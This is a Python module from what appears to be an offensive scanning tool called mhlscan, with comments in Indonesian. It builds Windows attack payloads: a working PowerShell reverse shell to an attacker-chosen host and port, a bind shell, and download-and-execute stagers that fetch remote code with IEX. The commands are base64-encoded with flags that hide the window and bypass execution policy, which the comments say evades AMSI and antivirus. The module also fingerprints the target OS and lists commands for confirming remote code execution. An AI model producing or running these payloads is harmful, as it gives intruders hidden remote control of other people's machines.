# -*- coding: utf-8 -*-
# GNU GPL License V3
# mhlscan by sigit-hdteamlabs
"""_windows_rce.py - Windows reverse shell payloads (PowerShell + CMD)."""

import base64


# ============================================================
# POWERSHELL REVERSE SHELL (classic, works Windows 7+)
# ============================================================
PS_REVERSE_SHELL = (
    "$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
    "$s=$c.GetStream();"
    "[byte[]]$b=0..65535|%{{0}};"
    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
    "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
    "$r=(iex $d 2>&1 | Out-String);"
    "$sb=([text.encoding]::ASCII).GetBytes($r + 'PS ' + (pwd).Path + '> ');"
    "$s.Write($sb,0,$sb.Length);$s.Flush()"
    "}};$c.Close()"
)


# ============================================================
# POWERSHELL DOWNLOAD & EXEC (stage-2 payload fetcher)
# ============================================================
PS_DOWNLOAD_EXEC = (
    "IEX (New-Object Net.WebClient).DownloadString('{url}')"
)


# ============================================================
# POWERSHELL BIND SHELL (jika reverse diblokir firewall)
# ============================================================
PS_BIND_SHELL = (
    "$l=New-Object System.Net.Sockets.TcpListener({lport});"
    "$l.start();$c=$l.AcceptTcpClient();"
    "$s=$c.GetStream();"
    "[byte[]]$b=0..65535|%{{0}};"
    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
    "$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
    "$r=(iex $d 2>&1 | Out-String);"
    "$sb=([text.encoding]::ASCII).GetBytes($r);"
    "$s.Write($sb,0,$sb.Length);$s.Flush()"
    "}};$c.Close()"
)


# ============================================================
# CMD-BASED REVERSE (jika PowerShell di-disable)
# ============================================================
CMD_REVERSE_SHELL = (
    "powershell -c \"& {{echo,IEX(New-Object Net.WebClient)."
    "DownloadString('{url}')}}\""
)


def encode_powershell(ps_command):
    """Base64 UTF-16-LE untuk -EncodedCommand (bypass AMSI/AV simple)."""
    return base64.b64encode(
        ps_command.encode("utf-16-le")
    ).decode()


def powershell_reverse_shell(lhost, lport, hidden=True):
    """Full reverse shell, encoded."""
    ps = PS_REVERSE_SHELL.format(lhost=lhost, lport=lport)
    encoded = encode_powershell(ps)

    flags = "-NoP -NonI -Exec Bypass"
    if hidden:
        flags += " -W Hidden"

    return f"powershell.exe {flags} -EncodedCommand {encoded}"


def powershell_reverse_shell_raw(lhost, lport):
    """Raw PowerShell (tidak di-encode) - untuk debug."""
    return PS_REVERSE_SHELL.format(lhost=lhost, lport=lport)


def powershell_download_exec(url, hidden=True):
    """Download & execute remote PS script."""
    ps = PS_DOWNLOAD_EXEC.format(url=url)
    encoded = encode_powershell(ps)
    flags = "-NoP -NonI -Exec Bypass"
    if hidden:
        flags += " -W Hidden"
    return f"powershell.exe {flags} -EncodedCommand {encoded}"


def powershell_bind_shell(lport, hidden=True):
    """Bind shell (listener di target)."""
    ps = PS_BIND_SHELL.format(lport=lport)
    encoded = encode_powershell(ps)
    flags = "-NoP -NonI -Exec Bypass"
    if hidden:
        flags += " -W Hidden"
    return f"powershell.exe {flags} -EncodedCommand {encoded}"


def detect_os_from_response(headers_dict, body_text):
    """
    Detect target OS dari HTTP response.
    Return "windows" | "linux" | "unknown"
    """
    headers_str = str(headers_dict).lower()
    body_lower = (body_text or "").lower()[:5000]

    # Windows signals
    win_signals = [
        "microsoft-iis", "iis/", "x-aspnet-version", "x-powered-by: asp.net",
        "aspnet_sessionid", "aspxauth", ".aspnet", "windows-nt",
        "win32", "win64", "microsoft-httpapi",
    ]
    win_score = sum(1 for s in win_signals
                    if s in headers_str or s in body_lower)

    # Linux signals
    linux_signals = [
        "ubuntu", "debian", "centos", "red hat", "fedora",
        "/var/www", "/etc/", "/usr/share", "apache/2",
        "php/", "python/", "ruby",
        "nginx", "httpd", "tomcat", "lighttpd", "caddy",
        "openresty", "haproxy",
        "coyote", "apache-coyote",
    ]
    linux_score = sum(1 for s in linux_signals
                      if s in headers_str or s in body_lower)

    if win_score > linux_score:
        return "windows"
    elif linux_score > win_score:
        return "linux"
    return "unknown"


def get_verify_payloads(os_type):
    """
    Return list of (method_name, payload) untuk verify RCE.
    Windows pakai 'timeout' sebagai sleep, Linux pakai 'sleep'.
    """
    if os_type == "windows":
        return [
            ("echo", "echo MHLSCAN_RCE_PROOF"),
            ("timeout", "timeout /t 5 /nobreak"),
            ("ping_delay", "ping -n 6 127.0.0.1"),
            ("whoami", "whoami"),
        ]
    else:  # linux atau unknown
        return [
            ("echo", "echo MHLSCAN_RCE_PROOF"),
            ("sleep", "sleep 5"),
            ("id", "id"),
        ]


# ============================================================
# SELF-TEST
# ============================================================
if __name__ == "__main__":
    print("=== Windows RCE Payloads ===")
    print()
    print("[1] PowerShell Reverse Shell (encoded):")
    rs = powershell_reverse_shell("10.0.0.5", 4444)
    print("    " + rs[:100] + "...")
    print("    Length:", len(rs), "chars")
    print()
    print("[2] Raw PowerShell:")
    print("    " + powershell_reverse_shell_raw("10.0.0.5", 4444)[:80] + "...")
    print()
    print("[3] OS Detection test:")
    print("    IIS:", detect_os_from_response(
        {"Server": "Microsoft-IIS/10.0"}, ""))
    print("    Nginx:", detect_os_from_response(
        {"Server": "nginx/1.20.0"}, ""))
    print()
    print("[4] Verify payloads:")
    print("    Windows:", [p[0] for p in get_verify_payloads("windows")])
    print("    Linux:  ", [p[0] for p in get_verify_payloads("linux")])
